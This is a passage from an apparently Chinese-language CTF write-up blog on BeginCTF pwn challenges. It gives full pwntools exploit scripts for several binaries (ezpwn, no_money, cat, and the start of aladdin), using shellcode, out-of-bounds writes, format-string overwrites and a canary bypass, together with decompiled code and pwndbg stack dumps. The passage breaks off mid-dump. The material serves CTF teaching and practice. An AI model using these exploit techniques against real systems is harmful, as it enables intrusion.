punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><p><code>test command</code>不能用<code>cat</code>和<code>sh</code>（官方<code>wp</code>指出<code>test command</code>对指令过滤不严，也可以利用<code>test command</code>），<code>test filename</code>不能输入<code>flag</code>，<code>teat data</code>功能是输入一个<code>index</code>，向数组该<code>index</code>处输入一个字符，而程序中有<code>shell</code>函数，所以调试一下计算返回地址到该数组之间的距离作为<code>index</code>，把返回地址地位改成<code>shell</code>函数低位即可，需要注意的是输入格式，行末要加回车不然会覆盖成回车</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unsigned __int64 main_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          puts<span class="token punctuation">(</span><span class="token string">"Please input index."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>          puts<span class="token punctuation">(</span><span class="token string">"please input value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v1 <span class="token operator">=</span> getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">31180</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>gift <span class="token operator">=</span> <span class="token number">0x1849</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input your choice.'</span><span class="token punctuation">,</span> <span class="token string">b'1\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input index.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x228</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input value'</span><span class="token punctuation">,</span> <span class="token string">b'\x51'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input your choice.'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="no-money"><a href="#no-money" class="headerlink" title="no_money"></a>no_money</h2><p>格式化字符串，但是禁用<code>$</code>，一般用<code>$</code>定位，本题中也学到一个知识点：<code>’%p’ * n + ‘%hn’ = ‘%n$hn’</code>,利用这一点，先泄露程序基址加上<code>shell</code>地址最后改返回地址低位为<code>shell</code>地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">31645</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your payload:'</span><span class="token punctuation">,</span> <span class="token string">b'%p-%p-%p-%p-%p-%p'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40</span>target <span class="token operator">=</span> <span class="token number">0x404C</span> <span class="token operator">+</span> codep <span class="token operator">=</span> <span class="token string">b'%255c'</span> <span class="token operator">+</span> <span class="token string">b'%p'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'%hhn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x60</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'payload:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>开了<code>canary</code>但是没开<code>pie</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">checksec pwn        <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token char">'/home/starrysky/beginctf/cat/pwn'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中有后门函数，<code>main</code>中向<code>bss</code>段两个变量输入数据，<code>vul</code>中向栈中输入数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read1<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read2<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span>read1<span class="token punctuation">,</span> read2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">vul</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>read1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>read2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 read3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-40h] BYREF</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-30h] BYREF</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-28h]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-20h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-8h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  read3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  read3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read3<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> read1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> read2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点就是绕过<code>canary</code>，这里学到一个知识点：<code>strcat</code>会从第一个<code>\x00</code>开始拼接，<code>strcpy</code>会在末尾写<code>\x00</code>，查看栈中数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg<span class="token operator">></span> stack00:0000│ rsp     0x7fffffffde00 —▸ 0x4041a0 <span class="token punctuation">(</span>cx<span class="token punctuation">)</span> ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */01:0008│         0x7fffffffde08 —▸ 0x4040a0 <span class="token punctuation">(</span>bx<span class="token punctuation">)</span> ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */02:0010│         0x7fffffffde10 ◂— 0xa616161 /* <span class="token string">'aaa\n'</span> */03:0018│         0x7fffffffde18 ◂— 0x0<span class="token punctuation">..</span>. ↓            <span class="token number">4</span> skippedpwndbg<span class="token operator">></span> 08:0040│     0x7fffffffde40 —▸ 0x7fffffffdf78 —▸ 0x7fffffffe311 ◂— <span class="token string">'/home/starrysky/beginctf/cat/pwn'</span>09:0048│     0x7fffffffde48 ◂— 0x40934e0df3212f000a:0050│ rbp 0x7fffffffde50 —▸ 0x7fffffffde60 ◂— 0x10b:0058│     0x7fffffffde58 —▸ 0x401381 <span class="token punctuation">(</span>main+183<span class="token punctuation">)</span> ◂— mov eax, <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用：<code>read3</code>覆盖掉<code>dest到canary</code>末尾的<code>\x00</code>，<code>strcat</code>拼接会从<code>canary</code>之后开始拼接，最后利用<code>strcpy</code>将<code>canary</code>末尾恢复成<code>\x00</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">30188</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>cat <span class="token operator">=</span> <span class="token number">0x4011FE</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cat<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'read:'</span><span class="token punctuation">,</span> <span class="token string">b'C'</span> <span class="token operator">*</span> <span class="token number">0x39</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="aladdin"><a href="#aladdin" class="headerlink" title="aladdin"></a>aladdin</h2><p>非常…痛苦的一题，本地和远程的偏移竟然不一样…用不了<code>ogg</code>，<code>bss</code>段上的<code>chance=4</code>，只能利用三次，所以这三次要先把<code>chance</code>改掉</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">--</span>chance <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your %d wish:\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>chance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>wish<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> wish<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strstr</span><span class="token punctuation">(</span>wish<span class="token punctuation">,</span> <span class="token string">"one more wish"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"no way!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The wonderful lamp is broken"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看栈结构，利用这几个地址来泄露一些需要的值：<code>code_base、stack、libc_base</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> stack<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp <span class="token number">0x7fffffffdd80</span> ◂— <span class="token number">0x7ffff7fc0005</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│     <span class="token number">0x7fffffffdd88</span> —▸ <span class="token number">0x7fffffffdd90</span> ◂— <span class="token number">0x20</span> <span class="token comment">/* ' ' */</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│     <span class="token number">0x7fffffffdd90</span> ◂— <span class="token number">0x20</span> <span class="token comment">/* ' ' */</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│     <span class="token number">0x7fffffffdd98</span> ◂— <span class="token number">0x3b00010015</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│     <span class="token number">0x7fffffffdda0</span> ◂— <span class="token number">0x10035</span> <span class="token comment">/* '5' */</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│     <span class="token number">0x7fffffffdda8</span> ◂— <span class="token number">0x5000000000006</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│     <span class="token number">0x7fffffffddb0</span> ◂— <span class="token number">0x7fff000000000006</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│     <span class="token number">0x7fffffffddb8</span> ◂— <span class="token number">0x163fe5f2dcc3a00</span>pwndbg<span class="token operator">></span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">0040</span>│ rbp <span class="token number">0x7fffffffddc0</span> ◂— <span class="token number">0x1</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">0048</span>│     <span class="token number">0x7fffffffddc8</span> —▸ <span class="token number">0x7ffff7dbcd90</span> ◂— mov edi<span class="token punctuation">,</span> eax<span class="token number">0</span>a<span class="token operator">:</span><span class="token number">0050</span>│     <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x0</span><span class="token number">0</span>b<span class="token operator">:</span><span class="token number">0058</span>│     <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x555555555229</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">0</span>c<span class="token operator">:</span><span class="token number">0060</span>│     <span class="token number">0x7fffffffdde0</span> ◂— <span class="token number">0x1ffffdec0</span><span class="token number">0</span>d<span class="token operator">:</span><span class="token number">0068</span>│     <span class="token number">0x7fffffffdde8</span> —▸ <span class="token number">0x7fffffffded8</span> —▸ <span class="token number">0x7fffffffe260</span> ◂— '<span class="token operator">/</span>home<span class="token operator">/</span>starrysky<span class="token operator">/</span>game_2024<span class="token operator">/</span>beginctf<span class="token operator">/</span>aladdin<span class="token operator">/</span>pwn'<span class="token number">0</span>e<span class="token operator">:</span><span class="token number">0070</span>│     <span class="token number">0x7fffffffddf0</span> ◂— <span class="token number">0x0</span><span class="token number">0f</span><span class="token operator">:</span><span class="token number">0078</span>│     <span class="token number">0x7fffffffddf8</span> ◂— <span class="token number">0xa251b96a3bc40170</span>pwndbg<span class="token operator">></span> <span class="token number">10</span><span class="token operator">:</span><span class="token number">0080</span>│  <span class="token number">0x7fffffffde00</span> —▸ <span class="token number">0x7fffffffded8</span> —▸ <span class="token number">0x7fffffffe260</span> ◂— '<span class="token operator">/</span>home<span class="token operator">/</span>starrysky<span class="token operator">/</span>game_2024<span class="token operator">/</span>beginctf<span class="token operator">/</span>aladdin<span class="token operator">/</span>pwn'<span class="token number">11</span><span class="token operator">:</span><span class="token number">0088</span>│  <span class="token number">0x7fffffffde08</span> —▸ <span class="token number">0x555555555229</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">12</span><span class="token operator">:</span><span class="token number">0090</span>│  <span class="token number">0x7fffffffde10</span> —▸ <span class="token number">0x555555557d88</span> <span class="token punctuation">(</span>__do_global_dtors_aux_fini_array_entry<span class="token punctuation">)</span> —▸ <span class="token number">0x5555555551e0</span> <span class="token punctuation">(</span>__do_global_dtors_aux<span class="token punctuation">)</span> ◂— endbr64 <span class="token number">13</span><span class="token operator">:</span><span class="token number">0098</span>│  <span class="token number">0x7fffffffde18</span> —▸ <span class="token number">0x7ffff7ffd040</span> <span class="token punctuation">(</span>_rtld_global<span class="token punctuation">)</span> —▸ <span class="token number">0x7ffff7ffe2e0</span> —▸ <span class="token number">0x555555554000</span> ◂— <span class="token number">0x10102464c457f</span><span class="token number">14</span><span class="token operator">:</span><span class="token number">00</span>a0│  <span class="token number">0x7fffffffde20</span> ◂— <span class="token number">0x5dae469580660170</span><span class="token number">15</span><span class="token operator">:</span><span class="token number">00</span>a8│  <span class="token number">0x7fffffffde28</span> ◂— <span class="token number">0x5dae56dda14e0170</span><span class="token number">16</span><span class="token operator">:</span><span class="token number">00</span>b0│  <span class="token number">0x7fffffffde30</span> ◂— <span class="token number">0x7fff00000000</span><span class="token number">17</span><span class="token operator">:</span><span class="token number">00</span>b8│  <span class="token number">0x7fffffffde38</span> ◂— <span class="token number">0x0</span>pwndbg<span class="token operator">></span> <span class="token number">18</span><span class="token operator">:</span><span class="token number">00</span>c0│  <span class="token number">0x7fffffffde40</span> ◂— <span class="token number">0x0</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> ↓     <span class="token number">2</span> skipped<span class="token number">1</span>b<span class="token operator">:</span><span 